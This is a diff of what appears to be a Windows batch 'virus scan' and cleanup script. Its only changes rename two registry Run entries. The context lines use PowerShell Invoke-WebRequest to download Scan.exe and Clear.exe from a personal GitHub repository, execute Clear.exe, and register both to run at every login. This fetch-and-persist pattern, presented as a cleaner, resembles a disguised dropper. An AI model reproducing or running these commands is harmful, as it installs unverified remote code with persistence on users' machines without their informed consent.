@@ -148,7 +148,7 @@ powershell.exe Invoke-WebRequest -Uri "https://adwcleaner.malwarebytes.com/adwcl
 powershell.exe Invoke-WebRequest -Uri "https://raw.githubusercontent.com/rrpt66/cc/main/Scan.exe" -OutFile "C:\startup\Scan.exe"
 C:\startup\adw.exe /preinstalled
 
-Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "(Default2)" /t REG_SZ /d "C:\startup\Scan.exe" /f
+Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Scan-virus" /t REG_SZ /d "C:\startup\Scan.exe" /f
 cls
 set /p wda=" start scan virus yes or no? > "
 if %wda%== yes goto :adw
@@ -594,7 +594,7 @@ cls
 powershell.exe Invoke-WebRequest -Uri "https://raw.githubusercontent.com/rrpt66/cc/main/Clear.exe" -OutFile "Clear.exe"
 mkdir C:\startup
 powershell.exe Invoke-WebRequest -Uri "https://raw.githubusercontent.com/rrpt66/cc/main/Clear.exe" -OutFile "C:\startup\Clear.exe"
-Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "(Default)" /t REG_SZ /d "C:\startup\Clear.exe" /f
+Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "fullclean" /t REG_SZ /d "C:\startup\Clear.exe" /f
 Clear.exe /k
 ping -n 4.5 127.0.0.1>nul
 cls
